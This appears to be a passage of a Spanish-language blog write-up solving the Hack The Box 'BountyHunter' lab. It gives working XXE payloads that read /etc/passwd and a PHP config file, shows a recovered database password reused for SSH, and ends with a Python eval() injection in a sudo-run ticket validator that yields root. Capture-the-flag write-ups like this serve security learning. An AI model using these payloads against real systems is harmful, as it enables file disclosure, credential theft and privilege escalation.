<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M5 2.5a.5.5 0 0 0-.5.5v18a.5.5 0 0 0 .5.5h14a.5.5 0 0 0 .5-.5V8.5h-4a2 2 0 0 1-2-2v-4H5zm10 0v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0-.146-.336l-4.018-4.018A.5.5 0 0 0 15 2.5zM3 3a2 2 0 0 1 2-2h9.982a2 2 0 0 1 1.414.586l4.018 4.018A2 2 0 0 1 21 7.018V21a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V3z"/></svg></span> <strong><code>bountylog.js</code></strong><br />
<div class="highlight"><pre><span></span><code>function returnSecret(data) {
        return Promise.resolve($.ajax({
            type: &quot;POST&quot;,
            data: {&quot;data&quot;:data},
            url: &quot;tracker_diRbPr00f314.php&quot;
            }));
}

async function bountySubmit() {
        try {
                var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
                &lt;bugreport&gt;
                &lt;title&gt;${$(&#39;#exploitTitle&#39;).val()}&lt;/title&gt;
                &lt;cwe&gt;${$(&#39;#cwe&#39;).val()}&lt;/cwe&gt;
                &lt;cvss&gt;${$(&#39;#cvss&#39;).val()}&lt;/cvss&gt;
                &lt;reward&gt;${$(&#39;#reward&#39;).val()}&lt;/reward&gt;
                &lt;/bugreport&gt;`
                let data = await returnSecret(btoa(xml));
                $(&quot;#return&quot;).html(data)
        }
        catch(error) {
                console.log(&#39;Error:&#39;, error);
        }
}
</code></pre></div>
El siguiente paso es generar el formulario en la url <code>http://bountyhunter.htb/portal.php</code> y analizar la request desde <a href="https://portswigger.net/burp">BurpSuite</a>  </p>
<p><img alt="" src="../../assets/bountyhunter/form.png" />
<img alt="" src="../../assets/bountyhunter/burp01.png" /></p>
<p>Enviamos todo a <code>Repeater</code> para trabajar con comodidad y nos llevamos el resultado de <code>data</code> a <code>Decoder</code> , para analizar y generar el payload que vamos a inyectar</p>
<p><img alt="" src="../../assets/bountyhunter/burp02.png" /></p>
<p>Como vemos en la imagen anterior, obtenemos el data limpio que se ha enviado como POST a <code>tracker_diRbPr00f314.php</code>.
A continuacion vamos a inyectar un payload para intentar leer <code>/etc/passwd</code> y lo volvemos a codear para 
enviarlo con repeater</p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M7.72.22a.75.75 0 0 1 1.06 0l1.204 1.203A4.983 4.983 0 0 1 12 1c.717 0 1.4.151 2.016.423L15.22.22a.75.75 0 0 1 1.06 1.06l-.971.972A4.988 4.988 0 0 1 17 6v1.104a2.755 2.755 0 0 1 1.917 1.974l1.998-.999a.75.75 0 0 1 .67 1.342L19 10.714V13.5l3.25.003a.75.75 0 1 1 0 1.5L19 15.001V16a7.02 7.02 0 0 1-.204 1.686.833.833 0 0 1 .04.018l2.75 1.375a.75.75 0 1 1-.671 1.342l-2.638-1.319A7 7 0 0 1 12 23a7 7 0 0 1-6.197-3.742l-2.758 1.181a.75.75 0 1 1-.59-1.378l2.795-1.199A7.007 7.007 0 0 1 5 16v-.996H1.75a.75.75 0 0 1 0-1.5H5v-2.79L2.415 9.42a.75.75 0 0 1 .67-1.342l1.998.999A2.755 2.755 0 0 1 7 7.104V6a4.99 4.99 0 0 1 1.69-3.748l-.97-.972a.75.75 0 0 1 0-1.06zM8.5 7h7V6a3.5 3.5 0 1 0-7 0v1zm-2 3.266V9.75c0-.69.56-1.25 1.25-1.25h8.5c.69 0 1.25.56 1.25 1.25V16a5.5 5.5 0 0 1-11 0v-5.734z"/></svg></span> <em>readfile payload</em>
<div class="highlight"><pre><span></span><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
                &lt;bugreport&gt;
                &lt;title&gt;&amp;xxe;&lt;/title&gt;
                &lt;cwe&gt;666&lt;/cwe&gt;
                &lt;cvss&gt;10&lt;/cvss&gt;
                &lt;reward&gt;80k&lt;/reward&gt;
                &lt;/bugreport&gt;
</code></pre></div>
<img alt="" src="../../assets/bountyhunter/burp03.png" /></p>
<p>Copiamos el resultado y vamos a <code>Repeater</code> para inyectar nuestro nuevo <code>data</code></p>
<p><img alt="" src="../../assets/bountyhunter/burp04.png" /></p>
<p>Genial! hemos conseguido leer un fichero de sistema. He probado varios payloads para xxe con la intencion
de realizar un <a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a> sin exito. Por lo que finalmente
he escrito un exploit para explotar directamente la vulnerabilidad desde consola y facilitarme la lectura de ficheros
en el sistema con la intencion de escalar privilegios.</p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.97 11.03a.75.75 0 1 1 1.06-1.06L11 14.94V2.75a.75.75 0 0 1 1.5 0v12.19l4.97-4.97a.75.75 0 1 1 1.06 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0l-6.25-6.25zm-.22 9.47a.75.75 0 0 0 0 1.5h14.5a.75.75 0 0 0 0-1.5H4.75z"/></svg></span> Descarga: <a href="../../assets/bountyhunter/xplxxe.sh"><strong>xplxxe.sh</strong></a></p>
<p><div class="highlight"><pre><span></span><code>[root@htb bountyhunter]# ./xplxxe.sh &quot;/etc/passwd&quot;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
-- SNIP --
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</code></pre></div>
Despues de estar un rato analizando ficheros en el sistema sin encontrar nada relevante, recorde que con 
<code>ffuf</code> encontre un fichero llamado <code>db.php</code> que seguramente contenga datos importantes.<br />
Tras intentar localizarlo dentro de la que deberia ser la ruta del servidor web <code>/var/www/html</code> sin exito,
tuve que modificar el payload para leer ficheros del servidor web a traves de php filter.<br />
Se trata de la funcion <a href="https://www.php.net/manual/en/filters.convert.php"><code>//filter/convert.base64-encode/resource</code></a> que viene incluida en PHP desde la version 5.0.0
y obliga a php a convertir los archivos a base64 antes de su ejecucion.<br />
Encontre la solucion en la increible documentacion de <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">HackTricks</a>  </p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M7.72.22a.75.75 0 0 1 1.06 0l1.204 1.203A4.983 4.983 0 0 1 12 1c.717 0 1.4.151 2.016.423L15.22.22a.75.75 0 0 1 1.06 1.06l-.971.972A4.988 4.988 0 0 1 17 6v1.104a2.755 2.755 0 0 1 1.917 1.974l1.998-.999a.75.75 0 0 1 .67 1.342L19 10.714V13.5l3.25.003a.75.75 0 1 1 0 1.5L19 15.001V16a7.02 7.02 0 0 1-.204 1.686.833.833 0 0 1 .04.018l2.75 1.375a.75.75 0 1 1-.671 1.342l-2.638-1.319A7 7 0 0 1 12 23a7 7 0 0 1-6.197-3.742l-2.758 1.181a.75.75 0 1 1-.59-1.378l2.795-1.199A7.007 7.007 0 0 1 5 16v-.996H1.75a.75.75 0 0 1 0-1.5H5v-2.79L2.415 9.42a.75.75 0 0 1 .67-1.342l1.998.999A2.755 2.755 0 0 1 7 7.104V6a4.99 4.99 0 0 1 1.69-3.748l-.97-.972a.75.75 0 0 1 0-1.06zM8.5 7h7V6a3.5 3.5 0 1 0-7 0v1zm-2 3.266V9.75c0-.69.56-1.25 1.25-1.25h8.5c.69 0 1.25.56 1.25 1.25V16a5.5 5.5 0 0 1-11 0v-5.734z"/></svg></span> <em>phpfilter payload</em></p>
<p><div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=db.php&quot; &gt;]&gt;
                &lt;bugreport&gt;
                &lt;title&gt;&amp;xxe;&lt;/title&gt;
                &lt;cwe&gt;d3l3t3m3&lt;/cwe&gt;
                &lt;cvss&gt;d3l3t3m3&lt;/cvss&gt;
                &lt;reward&gt;d3l3t3m3&lt;/reward&gt;
                &lt;/bugreport&gt;
</code></pre></div>
Una vez añadido al exploit, ahora si podemos leer el archivo <code>db.php</code></p>
<p><div class="highlight"><pre><span></span><code>[root@htb bountyhunter]# ./xplxxe.sh &quot;db.php&quot;
&lt;?php
// TODO -&gt; Implement login system with the database.
$dbserver = &quot;localhost&quot;;
$dbname = &quot;bounty&quot;;
$dbusername = &quot;admin&quot;;
$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;
$testuser = &quot;test&quot;;
?&gt;
</code></pre></div>
Reutilizamos esta contraseña contra el usuario <code>development</code> que encontramos en <code>/etc/passwd</code> y logramos acceder por ssh</p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2.5a5.5 5.5 0 0 0-3.096 10.047 9.005 9.005 0 0 0-5.9 8.18.75.75 0 0 0 1.5.045 7.5 7.5 0 0 1 14.993 0 .75.75 0 1 0 1.499-.044 9.005 9.005 0 0 0-5.9-8.181A5.5 5.5 0 0 0 12 2.5zM8 8a4 4 0 1 1 8 0 4 4 0 0 1-8 0z"/></svg></span> <code>development</code><br />
<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.75 8.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5z"/><path fill-rule="evenodd" d="M15.75 0a8.25 8.25 0 0 0-7.851 10.79L.513 18.178A1.75 1.75 0 0 0 0 19.414v2.836C0 23.217.784 24 1.75 24h1.5A1.75 1.75 0 0 0 5 22.25v-1a.25.25 0 0 1 .25-.25h2.735a.75.75 0 0 0 .545-.22l.214-.213A.875.875 0 0 0 9 19.948V18.5a.25.25 0 0 1 .25-.25h1.086c.464 0 .91-.184 1.237-.513l1.636-1.636A8.25 8.25 0 1 0 15.75 0zM9 8.25a6.75 6.75 0 1 1 4.288 6.287.75.75 0 0 0-.804.168l-1.971 1.972a.25.25 0 0 1-.177.073H9.25A1.75 1.75 0 0 0 7.5 18.5v1H5.25a1.75 1.75 0 0 0-1.75 1.75v1a.25.25 0 0 1-.25.25h-1.5a.25.25 0 0 1-.25-.25v-2.836a.25.25 0 0 1 .073-.177l7.722-7.721a.75.75 0 0 0 .168-.804A6.73 6.73 0 0 1 9 8.25z"/></svg></span> <code>m19RoAU0hP41A1sTsq6K</code>  </p>
<div class="highlight"><pre><span></span><code>[root@htb bountyhunter]# ssh -l development bountyhunter.htb
development@bountyhunter.htb&#39;s password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 30 Jul 2021 12:37:23 AM UTC

  System load:           0.0
  Usage of /:            26.0% of 6.83GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             209
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:50cd


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jul 29 15:54:43 2021 from 10.10.14.15
development@bountyhunter:~$ id
uid=1000(development) gid=1000(development) groups=1000(development)
</code></pre></div>
<h3 id="root-own"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12.876.64a1.75 1.75 0 0 0-1.75 0l-8.25 4.762a1.75 1.75 0 0 0-.875 1.515v9.525c0 .625.334 1.203.875 1.515l8.25 4.763a1.75 1.75 0 0 0 1.75 0l8.25-4.762a1.75 1.75 0 0 0 .875-1.516V6.917a1.75 1.75 0 0 0-.875-1.515L12.876.639zm-1 1.298a.25.25 0 0 1 .25 0l7.625 4.402-7.75 4.474-7.75-4.474 7.625-4.402zM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947L3.501 7.64zm9.25 13.421 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474v8.947z"/></svg></span> Root Own</h3>
<p>El vector de ataque para conseguir usuario root esta claro desde el principio, una enumeracion basica en la maquina nos pondra sobre la pista rapidamente  </p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.97 11.03a.75.75 0 1 1 1.06-1.06L11 14.94V2.75a.75.75 0 0 1 1.5 0v12.19l4.97-4.97a.75.75 0 1 1 1.06 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0l-6.25-6.25zm-.22 9.47a.75.75 0 0 0 0 1.5h14.5a.75.75 0 0 0 0-1.5H4.75z"/></svg></span> Descarga: <a href="../../assets/bountyhunter/ticketValidator.py"><strong>ticketValidator.py</strong></a>
<div class="highlight"><pre><span></span><code>development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre></div></p>
<p>Un analisis rapido nos indica que es un script para validar tickets que contiene varias verificaciones para asegurarse que es un ticket correcto.<br />
En la carpeta <code>/opt/skytrain_inc/invalid_tickets/</code> podemos encontrar unos tickets aparentemente invalidos.</p>
<p><div class="highlight"><pre><span></span><code>development@bountyhunter:~$ ls /opt/skytrain_inc/invalid_tickets/ -alt
total 24
drwxr-xr-x 2 root root 4096 Jul 22 11:08 .
drwxr-xr-x 3 root root 4096 Jul 22 11:08 ..
-r--r--r-- 1 root root  102 Jul 22 11:08 390681613.md
-r--r--r-- 1 root root   86 Jul 22 11:08 529582686.md
-r--r--r-- 1 root root   97 Jul 22 11:08 600939065.md
-r--r--r-- 1 root root  101 Jul 22 11:08 734485704.md
development@bountyhunter:~$ cat /opt/skytrain_inc/invalid_tickets/390681613.md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/opt/skytrain_inc/invalid_tickets/390681613.md
Destination: New Haven
Invalid ticket.
development@bountyhunter:~$
</code></pre></div>
Mi primera opcion es copiar uno de estos tickets e intentar modificarlo para conseguir que el script lo valide, pero para esto necesitamos comprender que hace exactamente el script.<br />
Vamos a analizarlo paso a paso:  </p>
<p>Lo primero que encontramos es una verificacion con la extension del archivo. <br />
Debe ser <code>.md</code> (<a href="https://en.wikipedia.org/wiki/Markdown">MarkDown</a>)</p>
<div class="highlight"><pre><span></span><code>def load_file(loc):
    if loc.endswith(&quot;.md&quot;):
        return open(loc, &#39;r&#39;)
    else:
        print(&quot;Wrong file type.&quot;)
        exit()
</code></pre></div>
<p>Seguidamente encontramos una funcion que verifica la estructura del archivo:</p>
<div class="highlight"><pre><span></span><code>def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()): # Lee las lineas del archivo
        if i == 0:
            if not x.startswith(&quot;# Skytrain Inc&quot;): # La primera linea debe empezar por # Skytrain Inc
                return False
            continue
        if i == 1:
            if not x.startswith(&quot;## Ticket to &quot;): # La segunda linea debe empezar por ## Ticket to
                return False
            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)
            continue

        if x.startswith(&quot;__Ticket Code:__&quot;): # La tercera linea debe empezar por __Ticket Code:__
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith(&quot;**&quot;): # La cuarta linea debe empezar por **
                return False
            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] # esto recoge y reemplaza el numero que pongamos, un *99+ quedaria en 99
            if int(ticketCode) % 7 == 4: # Esta funcion evalua si el entero que hemos puesto tiene un resto (remainder) de 4 
                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) # aqui esta el truco, parece que no se valida el &quot;cierre&quot; de la variable, aqui inyectaremos nuestro payload
                if validationNumber &gt; 100: # el entero con resto 4 debe ser mayor de 100
                    return True
                else:
                    return False
    return False
</code></pre></div>
<p>Teniendo todos los puntos claros, parece ser que los tickets invalidos encontrados cumplen casi todas las funciones excepto que los enteros dividos entre 7 no dan de resto 4.<br />
Para saber que numeros (mayores de 100) dan de resto 4, voy a escribir un script rapido.</p>
<p><div class="highlight"><pre><span></span><code>#!/usr/bin/env bash
#este script busca numeros entre 100 y 2000 que den como resto 4
for i in {100..2000};do
num=$(($i % 7))
if [ $num = 4 ];then
echo &quot;$i entre 7 da resto $num&quot;
fi
done
</code></pre></div>
Lanzamos el script
<div class="highlight"><pre><span></span><code>[root@htb bountyhunter]# ./calc.sh
102 entre 7 da resto 4
109 entre 7 da resto 4
116 entre 7 da resto 4
123 entre 7 da resto 4
130 entre 7 da resto 4
137 entre 7 da resto 4
144 entre 7 da resto 4
151 entre 7 da resto 4
158 entre 7 da resto 4
165 entre 7 da resto 4
-- SNIP ---
1985 entre 7 da resto 4
1992 entre 7 da resto 4
1999 entre 7 da resto 4
</code></pre></div></p>
<p>Ahora que tenemos numeros validos, vamos a construir un ticket y lo pasamos por el ticket validator</p>
<p><div class="highlight"><pre><span></span><code>development@bountyhunter:~$ cat lala.md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**1999**
##Issued: 2021/04/06
#End Ticket
</code></pre></div>
<div class="highlight"><pre><span></span><code>development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
lala.md
Destination: New Haven
Valid ticket.
</code></pre></div></p>
<p>Ahora que tenemos un ticket valido, vamos a inyectar un payload dando la primera variable como TRUE y agregando un and PAYLOAD , veamoslo :</p>
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M7.72.22a.75.75 0 0 1 1.06 0l1.204 1.203A4.983 4.983 0 0 1 12 1c.717 0 1.4.151 2.016.423L15.22.22a.75.75 0 0 1 1.06 1.06l-.971.972A4.988 4.988 0 0 1 17 6v1.104a2.755 2.755 0 0 1 1.917 1.974l1.998-.999a.75.75 0 0 1 .67 1.342L19 10.714V13.5l3.25.003a.75.75 0 1 1 0 1.5L19 15.001V16a7.02 7.02 0 0 1-.204 1.686.833.833 0 0 1 .04.018l2.75 1.375a.75.75 0 1 1-.671 1.342l-2.638-1.319A7 7 0 0 1 12 23a7 7 0 0 1-6.197-3.742l-2.758 1.181a.75.75 0 1 1-.59-1.378l2.795-1.199A7.007 7.007 0 0 1 5 16v-.996H1.75a.75.75 0 0 1 0-1.5H5v-2.79L2.415 9.42a.75.75 0 0 1 .67-1.342l1.998.999A2.755 2.755 0 0 1 7 7.104V6a4.99 4.99 0 0 1 1.69-3.748l-.97-.972a.75.75 0 0 1 0-1.06zM8.5 7h7V6a3.5 3.5 0 1 0-7 0v1zm-2 3.266V9.75c0-.69.56-1.25 1.25-1.25h8.5c.69 0 1.25.56 1.25 1.25V16a5.5 5.5 0 0 1-11 0v-5.734z"/></svg></span> <em>payload</em>
<div class="highlight"><pre><span></span><code># Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**1999+1 == 2000 and __import__(&#39;os&#39;).system(&#39;id&#39;) == False
##Issued: 2021/04/06
#End Ticket
</code></pre></div>
<div class="highlight"><pre><span></span><code>development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
lala.md
Destination: New Haven
uid=0(root) gid=0(root) groups=0(root)
Invalid ticket.
</code></pre></div></p>
                
              
              
                


              
            </article>
          </div>
        </div>
        
          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
            Back to top
          </a>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../explore/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Explore" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Explore
            </div>
          </div>
        </a>
      
      
        
        <a href="../../tools/htbenum/" class="md-footer__link md-footer__link--next" aria-label="Next: HTBenum" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              HTBenum
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
        
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.53c85856.min.js", "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.716f8af4.min.js"></script>
      
    
  </body>
</html>